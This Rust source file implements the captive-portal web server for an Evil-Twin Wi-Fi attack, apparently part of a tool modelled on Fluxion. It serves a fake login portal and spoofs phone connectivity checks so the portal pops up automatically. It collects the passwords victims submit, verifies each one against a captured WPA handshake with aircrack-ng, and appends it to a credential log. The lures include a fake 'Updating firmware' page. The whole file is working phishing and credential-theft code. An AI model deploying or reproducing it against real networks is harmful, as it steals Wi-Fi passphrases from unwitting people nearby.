//! Embedded captive-portal HTTP server for the Evil-Twin attack.
//!
//! Fluxion's flow, implemented natively (GPL-3.0-compatible reimplementation):
//! no lighttpd / php-cgi to install — the agent serves the portal itself.
//!
//! - `GET /` and static assets  -> the chosen portal directory (Fluxion-format
//!   `.portal` folders: index.html + css/ + js/ + images/).
//! - `POST /check`              -> reads the submitted password field, writes it
//!   to a candidate file, and verifies it against the captured handshake with
//!   `aircrack-ng -b <bssid> -w <candidate> <cap>`. Correct -> `final.html`,
//!   wrong -> `error.html` (the victim tries again; every attempt is logged).
//! - Connectivity emulation     -> Apple's `captive.apple.com` and Google's
//!   `generate_204` endpoints are answered per Host header so phones pop the
//!   portal automatically.
//! - Everything else            -> 307 redirect to `/` (captive capture).
//!
//! The server binds 10.42.0.1:80 (the gateway dnsmasq hands out) and runs until
//! the session owner stops it via `PortalServer::stop` (driven by the
//! Evil-Twin session teardown).

// Session-driven module: the portal server runs only while an Evil-Twin
// session is live (launched/stopped by evil_twin::launch/stop, rooted in
// main()) — the test-build dead-code lint needs this allowance.
#![allow(dead_code)]

use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

/// Where submitted credentials are appended (JSON lines).
pub const CREDENTIAL_LOG: &str = "/tmp/netspecter/evil-twin-credentials.jsonl";

pub struct PortalServer {
    stop: Arc<AtomicBool>,
    handle: Option<std::thread::JoinHandle<()>>,
    /// Credentials captured this session (mirrors the log on disk).
    pub credentials: Arc<Mutex<Vec<CapturedSubmission>>>,
}

#[derive(Clone, Debug)]
pub struct CapturedSubmission {
    pub at: String,
    pub client_ip: String,
    pub password: String,
    pub user_agent: String,
    pub verified: bool,
}

/// A verification result the browser is redirected to.
enum Verdict {
    Ok,
    Wrong,
}

impl PortalServer {
    /// Start serving `portal_dir` on `bind_addr` (e.g. "10.42.0.1:80").
    ///
    /// `cap_path` is the handshake capture to verify candidates against; when
    /// it does not exist, verification is skipped and every submission counts
    /// as captured (still logged) — same graceful degradation Fluxion shows.
    pub fn start(
        portal_dir: PathBuf,
        bind_addr: &str,
        bssid: String,
        cap_path: PathBuf,
    ) -> Result<Self, String> {
        if !portal_dir.join("index.html").is_file() {
            return Err(format!(
                "portal index.html not found under {}",
                portal_dir.display()
            ));
        }

        let listener = TcpListener::bind(bind_addr)
            .map_err(|e| format!("could not bind {bind_addr}: {e} (is another web server on port 80?)"))?;

        let stop = Arc::new(AtomicBool::new(false));
        let stop_thread = Arc::clone(&stop);
        let credentials: Arc<Mutex<Vec<CapturedSubmission>>> = Arc::new(Mutex::new(Vec::new()));
        let creds_thread = Arc::clone(&credentials);

        // The accept loop hands these to every connection — Arc them so each
        // per-connection thread gets its own clone instead of moving them out
        // on the first request.
        let portal_dir = Arc::new(portal_dir);
        let bssid = Arc::new(bssid);
        let cap_path = Arc::new(cap_path);

        let handle = std::thread::spawn(move || {
            for stream in listener.incoming() {
                if stop_thread.load(Ordering::Relaxed) {
                    break;
                }
                let Ok(stream) = stream else { continue };
                let creds = Arc::clone(&creds_thread);
                let dir = Arc::clone(&portal_dir);
                let bss = Arc::clone(&bssid);
                let cap = Arc::clone(&cap_path);
                std::thread::spawn(move || {
                    let _ = handle_client(stream, &dir, &bss, &cap, creds);
                });
            }
        });

        Ok(PortalServer {
            stop,
            handle: Some(handle),
            credentials,
        })
    }

    /// Stop accepting connections and join the accept loop.
    pub fn stop(&mut self) {
        self.stop.store(true, Ordering::Relaxed);
        // Dropping the listener is what wakes a blocking accept loop; the
        // listener is owned by the accept thread, so a connection from us is
        // the portable wake-up. 10.42.0.1 is the address we bound.
        let _ = std::net::TcpStream::connect("10.42.0.1:80");
        if let Some(h) = self.handle.take() {
            let _ = h.join();
        }
    }
}

fn handle_client(
    mut stream: TcpStream,
    portal_dir: &Path,
    bssid: &str,
    cap_path: &Path,
    creds: Arc<Mutex<Vec<CapturedSubmission>>>,
) -> std::io::Result<()> {
    let peer = stream.peer_addr().map(|a| a.ip().to_string()).unwrap_or_default();
    let mut reader = BufReader::new(stream.try_clone()?);

    // Read the request head.
    let mut request_line = String::new();
    reader.read_line(&mut request_line)?;
    let mut headers = Vec::new();
    let mut content_length = 0usize;
    let mut host = String::new();
    loop {
        let mut line = String::new();
        reader.read_line(&mut line)?;
        let trimmed = line.trim();
        if trimmed.is_empty() {
            break;
        }
        if let Some((name, value)) = trimmed.split_once(':') {
            let name = name.trim().to_ascii_lowercase();
            let value = value.trim().to_string();
            if name == "content-length" {
                content_length = value.parse().unwrap_or(0);
            }
            if name == "host" {
                host = value.to_ascii_lowercase();
            }
            headers.push((name, value));
        }
    }

    let user_agent = headers
        .iter()
        .find(|(n, _)| n == "user-agent")
        .map(|(_, v)| v.clone())
        .unwrap_or_default();

    let mut parts = request_line.split_whitespace();
    let method = parts.next().unwrap_or("GET");
    let target = parts.next().unwrap_or("/");
    let path = target.split('?').next().unwrap_or("/");

    // ── Connectivity-check emulation (phones auto-open the portal) ──
    if host.contains("captive.apple.com") {
        return respond(&mut stream, 200, "text/html", b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
    }
    if host.contains("connectivitycheck") || host.contains("clients3.google.com") || host.contains("clients4.google.com") {
        return respond(&mut stream, 204, "text/html", b"");
    }

    // ── Password submission ──
    if method == "POST" && (path == "/check" || path == "/check.php") {
        let mut body = vec![0u8; content_length.min(64 * 1024)];
        reader.read_exact(&mut body)?;
        let body = String::from_utf8_lossy(&body).to_string();

        let password = extract_password(&body);
        let verdict = if password.is_empty() {
            Verdict::Wrong
        } else if !cap_path.is_file() {
            // No capture to verify against — log it as-is (Fluxion's "hashless"
            // mode) and accept, so the victim stops retrying.
            Verdict::Ok
        } else {
            verify_against_handshake(bssid, &password, cap_path)
        };

        let verified = matches!(verdict, Verdict::Ok);
        creds.lock().unwrap().push(CapturedSubmission {
            at: chrono::Utc::now().to_rfc3339(),
            client_ip: peer,
            password: password.clone(),
            user_agent: user_agent.clone(),
            verified,
        });
        append_log(bssid, &password, &user_agent, verified);

        let page = match verdict {
            Verdict::Ok => "final.html",
            Verdict::Wrong => "error.html",
        };
        return redirect(&mut stream, &format!("/{page}"));
    }

    // ── Static content ──
    // error.html may not exist in every portal — synthesize a minimal one.
    if path == "/error.html" && !portal_dir.join("error.html").is_file() {
        return respond(
            &mut stream,
            200,
            "text/html",
            b"<html><body><h2>Incorrect password, please try again.</h2><p><a href=\"/\">Back</a></p></body></html>",
        );
    }
    if path == "/final.html" && !portal_dir.join("final.html").is_file() {
        return respond(
            &mut stream,
            200,
            "text/html",
            b"<html><body><h2>Connection restored. Updating firmware...</h2></body></html>",
        );
    }

    if method == "GET" || method == "HEAD" {
        let rel = path.trim_start_matches('/');
        let rel = if rel.is_empty() { "index.html" } else { rel };
        let file = portal_dir.join(rel);
        // Contain the path inside the portal dir.
        if file.starts_with(portal_dir) {
            if let Ok(bytes) = std::fs::read(&file) {
                let mime = mime_of(&file);
                return respond(&mut stream, 200, mime, &bytes);
            }
        }
    }

    // Everything else: bounce to the portal (the captive catch-all).
    redirect(&mut stream, "/")
}

/// Pull the submitted password out of a urlencoded body — Fluxion portals use
/// a variety of field names (password, key, passphrase, wpa_psw...); accept them all.
fn extract_password(body: &str) -> String {
    for pair in body.split('&') {
        let (name, value) = pair.split_once('=').unwrap_or(("", ""));
        let name = name.trim().to_ascii_lowercase();
        if matches!(
            name.as_str(),
            "password" | "password1" | "passphrase" | "key" | "key1" | "wpa" | "wpa_psw"
        ) {
            return urldecode(value);
        }
    }
    String::new()
}

/// Verify a candidate PSK against the captured handshake, Fluxion-style:
/// `aircrack-ng -b <bssid> -w <candidate-file> <cap>` is "correct" when the
/// output does NOT contain "Passphrase not in" / "KEY NOT FOUND".
fn verify_against_handshake(bssid: &str, password: &str, cap_path: &Path) -> Verdict {
    let candidate_path = std::env::temp_dir().join("netspecter-candidate.txt");
    if std::fs::write(&candidate_path, format!("{password}\n")).is_err() {
        return Verdict::Wrong;
    }
    let output = Command::new("aircrack-ng")
        .arg("-b").arg(bssid)
        .arg("-w").arg(&candidate_path)
        .arg(cap_path)
        .output();
    match output {
        Ok(out) => {
            let text = format!(
                "{}{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            )
            .to_ascii_lowercase();
            if text.contains("passphrase not in") || text.contains("key not found") {
                Verdict::Wrong
            } else {
                Verdict::Ok
            }
        }
        Err(_) => Verdict::Wrong,
    }
}

fn append_log(bssid: &str, password: &str, user_agent: &str, verified: bool) {
    use std::fmt::Write as _;
    let mut line = String::new();
    let _ = writeln!(
        line,
        "{{\"at\":\"{}\",\"bssid\":\"{}\",\"password\":\"{}\",\"user_agent\":\"{}\",\"verified\":{}}}",
        chrono::Utc::now().to_rfc3339(),
        bssid,
        password.replace('\\', "\\\\").replace('"', "\\\""),
        user_agent.replace('\\', "\\\\").replace('"', "\\\""),
        verified
    );
    if let Some(parent) = std::path::Path::new(CREDENTIAL_LOG).parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(CREDENTIAL_LOG)
        .and_then(|mut f| f.write_all(line.as_bytes()));
}

fn urldecode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'%' if i + 3 <= bytes.len() => {
                let hex = &s[i + 1..i + 3];
                if let Ok(b) = u8::from_str_radix(hex, 16) {
                    out.push(b);
                    i += 3;
                    continue;
                }
                out.push(b'%');
                i += 1;
            }
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn mime_of(path: &Path) -> &'static str {
    match path.extension().and_then(|e| e.to_str()).unwrap_or("") {
        "html" | "htm" => "text/html; charset=utf-8",
        "css" => "text/css",
        "js" => "application/javascript",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "svg" => "image/svg+xml",
        "ico" => "image/x-icon",
        "woff" => "font/woff",
        "woff2" => "font/woff2",
        "ttf" => "font/ttf",
        _ => "application/octet-stream",
    }
}

fn respond(stream: &mut TcpStream, status: u16, content_type: &str, body: &[u8]) -> std::io::Result<()> {
    let reason = match status {
        200 => "OK",
        204 => "No Content",
        302 => "Found",
        307 => "Temporary Redirect",
        _ => "OK",
    };
    let head = format!(
        "HTTP/1.1 {status} {reason}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nConnection: close\r\nCache-Control: no-store\r\n\r\n",
        body.len()
    );
    stream.write_all(head.as_bytes())?;
    if status != 204 {
        stream.write_all(body)?;
    }
    stream.flush()
}

fn redirect(stream: &mut TcpStream, location: &str) -> std::io::Result<()> {
    let head = format!(
        "HTTP/1.1 307 Temporary Redirect\r\nLocation: {location}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
    );
    stream.write_all(head.as_bytes())?;
    stream.flush()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_all_fluxion_field_names() {
        assert_eq!(extract_password("password=hunter2&x=1"), "hunter2");
        assert_eq!(extract_password("key1=abc%20def"), "abc def");
        assert_eq!(extract_password("wpa_psw=p%40ss"), "p@ss");
        assert_eq!(extract_password("nothing=here"), "");
    }

    #[test]
    fn urldecode_handles_plus_and_percent() {
        assert_eq!(urldecode("a+b%21"), "a b!");
        assert_eq!(urldecode("%E2%82%AC"), "\u{20AC}");
    }

    #[test]
    fn mime_table() {
        assert_eq!(mime_of(Path::new("a.css")), "text/css");
        assert_eq!(mime_of(Path::new("a.woff2")), "font/woff2");
        assert_eq!(mime_of(Path::new("a.bin")), "application/octet-stream");
    }
}
